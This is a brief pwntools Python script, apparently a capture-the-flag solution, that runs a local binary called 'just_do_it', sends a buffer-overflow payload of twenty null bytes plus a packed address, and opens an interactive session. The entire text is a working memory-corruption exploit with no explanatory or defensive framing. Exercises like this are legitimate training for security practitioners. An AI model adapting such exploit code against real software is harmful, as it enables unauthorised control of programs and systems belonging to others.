from pwn import *

target=process('./just_do_it')

payload=20*b'\x00'+p32(0x0804A080)
target.sendline(payload)
target.interactive()
